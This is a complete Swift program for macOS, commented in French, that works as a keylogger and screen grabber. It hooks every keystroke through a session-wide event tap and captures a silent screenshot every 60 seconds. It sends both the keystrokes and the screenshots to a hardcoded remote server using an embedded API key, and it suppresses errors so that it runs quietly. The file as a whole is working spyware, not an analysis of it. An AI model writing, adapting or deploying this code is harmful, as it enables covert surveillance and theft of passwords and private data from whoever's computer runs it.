import Foundation
import Cocoa
import Carbon

// --- CONFIGURATION ---
let serverURL = URL(string: "https://api.keylog.claverie.site")!
let apiKey = "72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ"
let machineID = Host.current().localizedName ?? "Mac-Unknown"

// Config Keylogger
let bufferLimit = 10
let timeLimit = 2.0

// Config Screenshot
let screenshotInterval = 60.0 // 60 secondes

// --- VARIABLES GLOBALES ---
var logBuffer = ""
var lastSendTime = Date()
var bufferLock = NSLock()

// ---------------------------------------------------------------------
// PARTIE 1 : FONCTIONS KEYLOGGER
// ---------------------------------------------------------------------

func sendLogs() {
    bufferLock.lock()
    if logBuffer.isEmpty {
        bufferLock.unlock()
        return
    }
    let logsToSend = logBuffer
    logBuffer = ""
    lastSendTime = Date()
    bufferLock.unlock()
    
    let json: [String: Any] = [
        "machine": machineID,
        "logs": logsToSend
    ]
    
    guard let jsonData = try? JSONSerialization.data(withJSONObject: json, options: []) else { return }
    
    var request = URLRequest(url: serverURL.appendingPathComponent("/upload_keys"))
    request.httpMethod = "POST"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
    request.httpBody = jsonData
    request.timeoutInterval = 10
    
    let task = URLSession.shared.dataTask(with: request) { _, _, _ in }
    task.resume()
}

func stringFromKeyCode(_ keyCode: CGKeyCode, _ event: CGEvent) -> String? {
    switch keyCode {
    case 36, 76: return "\n"
    case 48: return "\t"
    case 53: return "" 
    case 123, 124, 125, 126: return ""
    default: break
    }
    
    var length = 0
    var chars = [UniChar](repeating: 0, count: 4)
    var deadKeyState: UInt32 = 0
    
    let source = TISCopyCurrentKeyboardInputSource().takeRetainedValue()
    guard let layoutData = TISGetInputSourceProperty(source, kTISPropertyUnicodeKeyLayoutData) else { return nil }
    
    let dataRef = unsafeBitCast(layoutData, to: CFData.self)
    guard let ptr = CFDataGetBytePtr(dataRef) else { return nil }
    
    let flags = event.flags
    let modifierKeyState = (flags.rawValue >> 16) & 0xFF
    
    _ = ptr.withMemoryRebound(to: UCKeyboardLayout.self, capacity: 1) { layoutPtr in
        UCKeyTranslate(layoutPtr, keyCode, UInt16(kUCKeyActionDown), UInt32(modifierKeyState), UInt32(LMGetKbdType()), UInt32(kUCKeyTranslateNoDeadKeysBit), &deadKeyState, 4, &length, &chars)
    }
    
    if length > 0 { return String(utf16CodeUnits: chars, count: length) }
    return nil
}

let eventCallback: CGEventTapCallBack = { proxy, type, event, refcon in
    if type == .keyDown {
        let keyCode = event.getIntegerValueField(.keyboardEventKeycode)
        if keyCode == 51 {
            bufferLock.lock()
            if !logBuffer.isEmpty { logBuffer.removeLast() }
            bufferLock.unlock()
            return Unmanaged.passUnretained(event)
        }
        if let text = stringFromKeyCode(CGKeyCode(keyCode), event) {
            bufferLock.lock()
            logBuffer += text
            let shouldSend = logBuffer.count >= bufferLimit
            bufferLock.unlock()
            if shouldSend { sendLogs() }
        }
    }
    return Unmanaged.passUnretained(event)
}

// ---------------------------------------------------------------------
// PARTIE 2 : FONCTIONS SCREENSHOT (CORRIGÉ POUR macOS 15+)
// ---------------------------------------------------------------------

func createBody(parameters: [String: String], boundary: String, data: Data, mimeType: String, filename: String) -> Data {
    var body = Data()
    let boundaryPrefix = "--\(boundary)\r\n"
    
    for (key, value) in parameters {
        body.append(boundaryPrefix.data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"\(key)\"\r\n\r\n".data(using: .utf8)!)
        body.append("\(value)\r\n".data(using: .utf8)!)
    }
    
    body.append(boundaryPrefix.data(using: .utf8)!)
    body.append("Content-Disposition: form-data; name=\"file\"; filename=\"\(filename)\"\r\n".data(using: .utf8)!)
    body.append("Content-Type: \(mimeType)\r\n\r\n".data(using: .utf8)!)
    body.append(data)
    body.append("\r\n".data(using: .utf8)!)
    body.append("--\(boundary)--\r\n".data(using: .utf8)!)
    
    return body
}

func takeAndUploadScreenshot() {
    // 1. Définir un chemin temporaire pour l'image
    let tempPath = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("temp_capture_\(UUID().uuidString).jpg")
    
    // 2. Utiliser l'outil système 'screencapture' (fonctionne sur toutes versions macOS)
    // -x : pas de son
    // -t jpg : format jpeg
    // -m : écran principal uniquement
    let task = Process()
    task.executableURL = URL(fileURLWithPath: "/usr/sbin/screencapture")
    task.arguments = ["-x", "-t", "jpg", "-m", tempPath.path]
    
    do {
        try task.run()
        task.waitUntilExit()
        
        // 3. Lire le fichier créé
        let jpegData = try Data(contentsOf: tempPath)
        
        // 4. Nettoyer (supprimer le fichier temporaire)
        try FileManager.default.removeItem(at: tempPath)
        
        // 5. Envoyer au serveur
        uploadData(jpegData: jpegData)
        
    } catch {
        // En mode silencieux, on ignore l'erreur
    }
}

func uploadData(jpegData: Data) {
    let url = serverURL.appendingPathComponent("/upload_screen")
    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
    
    let boundary = "Boundary-\(UUID().uuidString)"
    request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
    
    let params = ["machine": machineID]
    request.httpBody = createBody(parameters: params, boundary: boundary, data: jpegData, mimeType: "image/jpeg", filename: "screen.jpg")
    
    let task = URLSession.shared.dataTask(with: request) { _, _, _ in }
    task.resume()
}

// ---------------------------------------------------------------------
// MAIN
// ---------------------------------------------------------------------
print("Keylogger + Screenshot (System Tool) Started...")

// Timer 1 : Keylogger
Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
    if Date().timeIntervalSince(lastSendTime) >= timeLimit {
        sendLogs()
    }
}

// Timer 2 : Screenshot
Timer.scheduledTimer(withTimeInterval: screenshotInterval, repeats: true) { _ in
    takeAndUploadScreenshot()
}

// Hook Clavier
let eventMask = (1 << CGEventType.keyDown.rawValue)
guard let eventTap = CGEvent.tapCreate(tap: .cgSessionEventTap, place: .headInsertEventTap, options: .defaultTap, eventsOfInterest: CGEventMask(eventMask), callback: eventCallback, userInfo: nil) else {
    exit(1)
}

let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0)
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
CGEvent.tapEnable(tap: eventTap, enable: true)

CFRunLoopRun()
